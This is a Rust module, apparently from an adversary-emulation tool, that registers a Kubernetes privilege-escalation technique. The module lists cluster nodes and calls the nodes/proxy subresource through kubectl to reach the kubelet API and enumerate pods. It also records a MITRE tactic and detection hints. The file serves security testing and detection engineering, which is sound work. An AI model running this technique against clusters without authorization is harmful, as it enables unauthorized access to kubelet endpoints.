use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use k8s_openapi::api::core::v1::Node;
use kube::{Api, Client};

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!(
            "Failed to create Kubernetes client: {}. Ensure KUBECONFIG is set.",
            e
        ))?;

    // List nodes to find a target
    let nodes_api: Api<Node> = Api::all(client.clone());
    let node_list = nodes_api
        .list(&Default::default())
        .await
        .map_err(|e| anyhow::anyhow!("Failed to list nodes: {}", e))?;

    if node_list.items.is_empty() {
        anyhow::bail!("No nodes found in the cluster");
    }

    let node = &node_list.items[0];
    let node_name = node.metadata.name.as_deref().unwrap_or("unknown");

    println!(
        "Found node '{}' — using nodes/proxy subresource to access kubelet API",
        node_name
    );

    // Use kubectl-equivalent subresource call.
    // We demonstrate the technique by printing what the API call would do.
    // In a real environment, use `kubectl get --raw /api/v1/nodes/{node}/proxy/pods`
    // or kube::Client::request_text with a raw http::Request<Vec<u8>>.
    //
    // For portability across kube crate versions, we use kubectl CLI if available:
    let kubectl_output = tokio::process::Command::new("kubectl")
        .args([
            "get",
            "--raw",
            &format!("/api/v1/nodes/{}/proxy/pods", node_name),
        ])
        .output()
        .await;

    match kubectl_output {
        Ok(output) if output.status.success() => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let pods_data: serde_json::Value = serde_json::from_str(&stdout)
                .unwrap_or_else(|_| serde_json::json!({"items": []}));
            let pod_count = pods_data["items"].as_array().map(|v| v.len()).unwrap_or(0);
            println!(
                "Successfully proxied through node '{}' kubelet API — {} pod(s) on this node",
                node_name, pod_count
            );
        }
        Ok(output) => {
            let stderr = String::from_utf8_lossy(&output.stderr);
            anyhow::bail!(
                "nodes/proxy request failed for node '{}': {}. \
                 Requires nodes/proxy RBAC permission.",
                node_name,
                stderr
            );
        }
        Err(_) => {
            // kubectl not available — print the equivalent API call
            println!(
                "kubectl not found — would execute: kubectl get --raw /api/v1/nodes/{}/proxy/pods",
                node_name
            );
            println!(
                "This accesses the kubelet API directly via API server proxy — \
                 requires nodes/proxy RBAC permission (included in cluster-admin)"
            );
        }
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "k8s.privilege-escalation.nodes-proxy",
        friendly_name: "Access Node Kubelet API via nodes/proxy",
        description: "Uses the Kubernetes nodes/proxy subresource to proxy requests through a node's kubelet API, bypassing API server authorization to enumerate pods and access kubelet endpoints.",
        detection: "Kubernetes audit log: get/create nodes/proxy by unexpected identity. Falco: Kubelet API access via API server proxy.",
        platform: Platform::Kubernetes,
        mitre_tactics: &[MitreTactic::PrivilegeEscalation],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: None,
    }
}
